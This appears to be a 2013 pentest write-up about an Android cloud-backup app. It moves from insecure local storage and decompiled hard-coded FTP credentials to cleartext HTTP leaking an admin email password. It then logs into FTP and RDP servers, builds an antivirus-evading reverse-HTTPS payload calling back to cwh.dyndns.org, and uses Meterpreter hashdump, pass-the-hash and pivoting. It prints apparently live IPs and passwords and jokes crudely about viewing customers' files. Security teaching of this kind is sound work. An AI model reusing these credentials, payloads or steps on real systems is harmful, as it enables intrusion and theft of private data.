000000000000000000000000000000000000000000000000
00000000000000 00000000000000000 000000000000000			During the past few years, we've seen mobile devices evolve from simple,
000000000000000  00000000000000  000000000000000		 rather dumb phones to complete, integrated communication devices.
000000000000000   00000000000   0000000000000000		 As these devices became more intelligent ("smart" phones) and data
0000000000000000               00000000000000000		 transfer speeds on mobile networks increased significantly, people no longer
00000000000000                   000000000000000		 used them solely for making phone calls or sending text messages, but started
000000000000    000         000    0000000000000		 using them for sending email, browsing the Internet, playing games, checking-in
00000000000     000         000     000000000000		 for flights, or doing online banking transactions.
0000000000                           00000000000		 
0000000000                           00000000000		 	Companies started creating mobile applications to offer all sorts of services to their
000000000000000000000000000000000000000000000000		 clients. Today, mobile applications are available for storing and synchronizing data	
0000    00                            00    0000		 files in the cloud, participating in social network sites, or even playing with a talking
000     00                            00     000		 crazy frog.
000     00                            00     000		 
000     00                            00     000		 	As the data that is stored, processed, and transferred by these applications can often
000     00                            00     000		 be considered sensitive, it is important to ensure that the security controls on these mobile	
0000   000                            000   0000		 devices and applications is effective.

		This papers is the narrative and the explanation of our penetration testing techniques from the real world as a case study of an Android application 
	testing (Android is a Linux-based platform developed by Google and the Open Handset Alliance. Application programming for it is done exclusively in Java. 
	The Android operating system software stack consists of Java applications running on a Dalvik virtual machine (DVK)). The main functions of this application 
	work similarly to the famous Apple's iCloud; backup picture, video, contact and sync to a personal cloud system.

	Let's Begin! :))


#####################################
 [0x01] - Application Reconnaissance
#####################################
	
		"Usually, a client software package is installed locally on the mobile device which acts as the front-end for the user. Packages are typically downloaded 
	from an app store or market, or provided via the company's website. Similar to non-mobile software, these applications can contain a myriad of vulnerabilities. 
	It is important to note that most testing on the client device usually requires a device that is rooted or jailbroken. For example, the authentic mobile OS 
	will most likely prevent you from having access to all files and folders on the local file system. Furthermore, as software packages can often be decompiled, 
	tampered with or reverse engineered, you may want to use a device that does not pose any restrictions on the software that you can install."

--SANS Penetration Testing Blog

		Our first mission is Application Reconnaissance. The objective of this mission is to understand how the application work, then try to enumerate sensitive information 
	from data stored in a local storage and to dig out even more information, application package will be decompiled into a form of source code. 

	
	+++++++++++++++++++++++++++++++++
	 [0x01a] - Insecure Data Storage
	+++++++++++++++++++++++++++++++++

			We've started our first mission by creating an Android Pentest platform (Install Android SDK, Android Emulator and Burpsuite proxy) and get ready to 
		connect to our phone using Android Debug Bridge (http://developer.android.com/tools/help/adb.html) , ADB is a versatile command line tool that lets you
		communicate with an emulator instance or connected Android-powered device.

			First, we signed up and logged in to the application then used ADB to connect a phone with a debug mode and used "adb devices" command.

	---------------------------------------------------------------
	[zeq3ul@12:03:51]-[~]> adb devices
	* daemon not running. starting it now *
	* daemon started successfully *
	List of devices attached
	3563772CF3BC00FH device
	---------------------------------------------------------------
	
			"adb shell" command was the command we've used to connect to the phone in order to explore through the internal directory.

			Before we can do any further exploration, we need to identify real name of the application package which usually found in "/data/app/" folder in a 
		form of ".apk". 
			
			"/data/app/com.silentm.msec-v12.apk" was found to be a package of our target application so "com.silentm.msec-v12" is the real name of the package.
	
			Finally, folder belonging to the application in "/data/data" is most likely to be the place that sensitive information of the application are stored 
		locally. As expected, we found crucial information stored in "/data/data/com.silentm.msec-v12/shared_prefs" as below.

	---------------------------------------------------------------
	[zeq3ul@12:05:24]-[~]> adb shell
	# cd /data/data/com.silentm.msec-v12/shared_prefs
	# cat PREFS.xml

	<?xml versions='1.0' encoding='utf-8' standalone='yes'?>
	<map>
	<string name="Last_added">9</string>
	<boolean name"configured" value="true"/>
	<string name="package">Trial</string>
	<string name="version">1.2</string>
	<string name="username">zeq3ul</string>
	<string name="password">NXBsdXM0PTEw</string>
	<string name="number">089383933283</string>
	<string name="supportedextension">{&quote;D&quote;:&quote;HTML,XLS,XLSX,XML,TXT,DOC,DOCX,PPT,PDF,ISO,ZIP,RAR,RTF&quote;,&quote;M&quote;:
	&quote;MP3,MP2,WMA,AMR,WAV,OGG,MMF,AC3&quote;,&quote;I&quote;:&quote;JPEG,JPG,GIF,BMP,PNG,TIFF&quote;,&quote;V&quote;:&quote;3GP,MP4,MPEG,
	WMA,MOV,FLV,MKV,MPEG4,AVI,DivX&quote;}</string>
	...
	</map>	
	---------------------------------------------------------------

			We've found our username and password stored locally in PREFS.xml, but password seems to be encrypted with some kind of encyption but if we take a 
		good look into it you will found it was only base64 encoded string, so we can easily decoded it to reveal a real password. "NXBsdXM0PTEw" > "5plus4=10"

			TIPS! This is a bad example of how applications store sensitive data and also the encoding with Base64 (Encode != Encrypt) is such a bad idea of 
		storing a password too. Example for bad code shown below:

	---------------------------------------------------------------
	public void saveCredentials(String userName,String password)
	{
	SharedPreferences PREFS;
	PREFS=getSharedPreferences(MYPREFS,Activity.MODE_PRIVATE);
	SharedPreferences.Editor editor = PREFS.edit();
	String mypassword = password;
	String base64password = new String(Base64.encodeToString(mypassword.getBytes(),4));	
	editor.putString("Username", userName);
	editor.putString("Password", base64password);
	editor.commit();		
	}
	---------------------------------------------------------------

	
	+++++++++++++++++++++++++++++++++++++++++
	 [0x01b] - Decompile Application Package
	+++++++++++++++++++++++++++++++++++++++++	

			Next, in order to completely understand the mechanism of the application, we need to obtain the source code of the application. For Android 
		application, this can be done by decompiling the Android Package (".apk") of the application.
		
			Android packages (".apk" files) are actually simply ZIP files. They contain the AndroidManifest.xml, classes.dex, resources.arsc, among other 
		components. You can rename the extension and open it with a ZIP utility such as WinZip to view its contents.
	
			We've started with "adb pull" command to extract android application from mobile phone.

	---------------------------------------------------------------
	[zeq3ul@12:08:37]-[~]> adb pull /data/app/com.silentm.msec-v12.apk
	1872 KB/s (5489772 bytes in 2.862s)
	---------------------------------------------------------------

			The next step is to decompile ".apk" we've just got using the tools called dex2jar (http://code.google.com/p/dex2jar/). dex2jar is intended to 
		convert ".dex" files to human readable ".class" files in java.

			NOTICE! "class.dex" is stored in every ".apk" as mentioned above. This can be proved by changing any ".apk" to ".zip" and extracting it then you 
		will find out about the structure of an ".apk"

	---------------------------------------------------------------
	[zeq3ul@12:09:11]-[~]> bash dex2jar.sh com.silentm.msec-v12.apk
	dex2jar version: translator-0.0.9.8
	dex2jar com.silentm.msec-v12.apk -> com.silentm.msec-v12_dex2jar.jar
	Done.
	---------------------------------------------------------------

			JD-GUI (http://java.decompiler.free.fr/?q=jdgui) is our tool of choice to read a decompiled source (".jar" from dex2jar). In this case 
		is "com.silentm.msec-v12_dex2jar.jar"

			NOTE: JD-GUI is a standalone graphical utility that displays Java source codes of “.class” files. You can browse the reconstructed source code 
		with the JD-GUI for instant access to methods and fields. 

			As a result, We found that "Config.class" stored smelly information (hard-coded) the source as shown below:

	Config.class

	---------------------------------------------------------------
	package com.silentm.msec;

	public class Config
	{
	public static final String CONTACT_URL = "http://203.60.240.180/en/Contact.aspx";
	public static final String Check_Memory = "http://203.60.240.180/en/CheckMem.aspx";
	public static final String BackupSMS = "http://203.60.240.180/en/backupsms.aspx";
	public static final String Forgot_Password = "http://203.60.240.180/en/ForgotPassword.aspx";
	public static final String FTP_URL = "203.60.240.183";
	public static final String FTP_User = "msec1s";
	public static final String FTP_Password = "S1lentM!@#$ec";
	public static final String Profile = "http://203.60.240.180/en/Profile.aspx";
	public static final int MAX_MEMORY = 500;
	public static final int LOG_COUNT = 30;
	...
	}
	---------------------------------------------------------------

			Explain!! backup URL and FTP user and password was found in the source code (W00T W00T !!). Now we know that this application use FTP protocol to 
		transfer picture, SMS, contact information to cloud server and it's SUCK!! because it's hard-coded and FTP is not a secure protocol.

		
###################################
 [0x02] - Man in the Middle Attack
###################################

		"The second attack surface is the communications channel between the client and the server. Although applications use more and more secured communications 
	for sending sensitive data, this is not always the case. In your testing infrastructure, you will want to include an HTTP manipulation proxy to intercept and alter traffic. 
	If the application does not use the HTTP protocol for its communication, you can use a transparent TCP and UDP proxy like the Mallory tool. By using a proxy, you can intercept, 
	analyze, and modify data that is communicated between the client and the server."

--SANS Penetration Testing Blog

		As we found that our target application use HTTP protocol, the next step is to setup a HTTP intercepting proxy tools such as ZapProxy or Burpsuite (Burpsuite was chosen this time) 
	in order to perform our second misson, Man in the Middle attack, agaist the application. Having a web proxy intercepting requests is a key piece of the puzzle. From this point forward, 
	our test will use similar technique to that of regular web applications testing.

		We've tried to intercepted every HTTP requests and response on application with Burpsuite Proxy (http://www.portswigger.net/burp/). For HTTP request, we found sensitive information 
	(username and password) sent to server-side because it use HTTP protocol that sent packet in clear text while performing log in shown below (anyone in the middle of this communication 
	will see those information crystal clear, what a kind App!).

	
	Burpsuite: HTTP Request

	---------------------------------------------------------------
	POST http://203.60.240.180/en/GetInfo.aspx HTTP/1.1
	Content-Length: 56
	Content-Type: application/x-www-form-urlencoded
	Host: 203.60.240.180
	Connection: Keep-Alive
	User-Agent: Apache-HttpClient/UNAVAILABLE	(java 1.4)

	imei=352489051163052&username=zeq3ul&password=5plus4=10
	---------------------------------------------------------------

		Moreover, on HTTP response, We found the information that surprise us; email and password for Gmail of someone (we found out latter that was an administrator email) 
	was shown in front of our eyes!.


	Burpsuite: HTTP Response

	---------------------------------------------------------------
	HTTP/1.1 200 OK
	Cache-Control: private
	Content-Type: text/html; charset=utf=8
	Server: Microsoft-IIS/7.0
	X-AspNet-Version: 2.0.50727
	X-Powered-By: ASP.NET
	Date: Fri, 07 June 2013 12:15:37 GMT
	Content-Length: 2405

	{"AppVersion":"1.2","FTP_USER":"msec1s","FTP_PASS":"S1lentM!@#$ec","FTP_SERVER":"203.60.240.183","MAX_MEMORY":"500","LOG_COUNT":"30",
	"Smtp":"smtp.gmail.com","FromEmail":"mseccloud@gmail.com","FromEmailPwd":"M[Sec)0/",................
	---------------------------------------------------------------

		As a result, We were able to sniff username and password in clear text (no SSL nor encryption) and compromise the email of an administrator 
	using email "mseccloud@gmail.com" and password "M[Sec)0/" that they gave us for free via HTTP reponse. :\


#############################	
 [0x03] - Server-Side Attack
#############################
		
		"In most cases, the server to which the client communicates is one or more web servers. The attack vectors for the web servers behind a mobile application 
	is similar to those we use for regular web sites. Aside from looking for vulnerabilities in the web application, you should also perform host and service scans 
	on the target system(s) to identify running services, followed by a vulnerability scan to identify potential vulnerabilities, provided that such testing is allowed 
	within the scope of the assignment."

	++++++++++++++++++++
	 [0x03a] - Scanning 
	++++++++++++++++++++

			As we've found backend URL (203.60.240.180 and 203.60.240.183) from the source code, we need to check the security of the backend system as well. 
		We've started by scanning target for open ports by using nmap (http://nmap.org).
	
	
	Nmap Result for 203.60.240.180

	---------------------------------------------------------------
		
			From the scan result, we got a list of opening ports and we've found that there were IIS and Terminal Service running on 203.60.240.180 
		and FTP running on 203.60.240.183; It's time to grab low-hanging fruits.
		
		
	++++++++++++++++++++++++++
	 [0x03b] - Gaining Access
	++++++++++++++++++++++++++

			As we found FTP username and password from the source code ("msec1s","S1lentM!@#$ec"). We were able to access to FTP service running on the server as shown below:

	FTP Server: 203.60.240.183
	---------------------------------------------------------------
	[zeq3ul@12:40:12]-[~]> ftp 203.60.240.183
	Connected to 203.60.140.183
	220 Microsoft FTP Service
	User <203.60.140.183:<none>>: msec1s
	331 Password required
	Password:
	230 User logged in.
	ftp> pwd
	257 "/" is current directory.
	ftp>
	---------------------------------------------------------------
		
			Now that we've compromised FTP Server using account "msec1s". We were able to access all customer contact, picture, video, Etc. Excitedly, we expected to find some "INTERESTING" picture 
		or Clip video; BUT we found DICK! WTF!! so we got shock and stop searching. OTL

			Moving to our next target, 203.60.240.180, we've tried to access target via Terminal Service. Luckily, we were able to access target server using the same username and password from FTP Server 
		("msec1s","S1lentM!@#$ec"). Yummy!
		
	Remote Desktop with rdesktop
	---------------------------------------------------------------
	[zeq3ul@12:56:04]-[~]> rdesktop -u msec1s -p S1lentM!@#$ec 203.60.240.180
	---------------------------------------------------------------

			Moreover, "msecls" account was in an administrator privileges group. OWNAGED!

	+++++++++++++++++++++++++++++
	 [0x03c] - Bypass Anti-virus
	+++++++++++++++++++++++++++++

			Many Anti-Virus programs work by pattern or signature matching. If any program look like malware by its appearance, the AV will catch it. If the malicious file 
		has a signature that the AV do not know, AV are most likely to identify those file as clean and unharmed.

			"Veil, a new payload generator created by security expert and Blackhat USA class instructor Chris Truncer, does just that."
		-- https://www.christophertruncer.com/veil-a-payload-generator-to-bypass-antivirus/

			Simply pick payload and use msfveom shellcode, chose reverse HTTPS to our web server (cwh.dyndns.org) by following command:

	---------------------------------------------------------------
	========================================================================
	Veil | [Version]: 1.1.0 | [Updated]: 06.01.2013

	1 - msfvenom (default)
	2 - Custom

	[>] Please enter the number of your choice: 1

	[?] What type of payload would you like?

	1 - Reverse TCP
	2 - Reverse HTTP
	3 - Reverse HTTPS
	0 - Main Menu

	>] Please enter the number of your choice: 3
	[?] What's the Local Host IP Address: cwh.dyndns.org
	[?] What's the Local Port Number: 443
	---------------------------------------------------------------

			Now we've got payload.exe file, When any Windows system execute this .exe, they will try to connect to the our server immediately.
	
	
	+++++++++++++++++++++++++++
	 [0x03d] - PWNED System !!
	+++++++++++++++++++++++++++

			Time to PWN! As the target server (203.60.140.180) can be access using MSRDP Service (on port 3389) + it has access to the internet, we can just open 
		the web server on our machine and then remote (via MSRDP) to the server to download and get our payload (payload.exe) executed. Executed Metasploit payload 
		(payload.exe) will connect a meterpreter payload back (reverse_https) to our server (cwh.dyndns.org).

			After that, we used hashdump to get LM/NTLM hash on server but this cannot be done yet because if you are on a x64 box and meterpreter isn't running in a x64 process, 
		it will fail saying that it doesn't have the correct version offsets (x64 system and Meterpreter is x86/win32). So we need to find a good process to migrate into and 
		kick it from there. In this case we migrate our process to Winlogon process which running as x64 box. 

			Our console will have a log like this.

			In common case, a next thing to do is to begin to crack the hashes we've got for later use. There are many caveats to cracking Windows hashes and it does take some time 
		so you might as well begin this process ASAP right?
 
			However, there is often no reason to spend time/cycles cracking hashes when you can "PASS THE HASH".
	
			One of the most common way to "pass the hash" is by using the PSEXEC module (exploit/windows/smb/psexec) in Metasploit. This module executes an arbitrary payload by authenticating 
		to Windows SMB using administrative credentials (password or hash), and creating a Windows service. This is a pretty powerful module on most pen-test tools, once you get to the point of dumping 
		hashes on a Windows machine.

			"Once you use it successfully it will become very apparent that this power could be multiplied by several orders of magnitude if someone wrote a scanning-capable version that accepts an RHOSTS option 
		rather than a single RHOST. Apparently that's what Carlos Perez thought when he wrote psexec_scanner"

			So we were able to compromise another machine (203.60.240.165).

			We typed "netstat -an" to view open ports on the target and found that Remote Desktop (MSRDP on port 3389) opened but we cannot directly remote to the target
		because the port was filtered by firewall. But there is the way to bypass this control. 

			We used "portfwd" command from the Meterpreter shell. Portfwd is most commonly used as a pivoting technique to allow direct access to machines otherwise inaccessible 
		from the attacking system. Running this command on the compromised host with access to both the attacker and destination network (or system), we can essentially forward 
		TCP connections through this machine effectively making it a pivot point much like the port forwarding technique used with an ssh connection, portfwd will relay TCP connections to and from the connected machines.
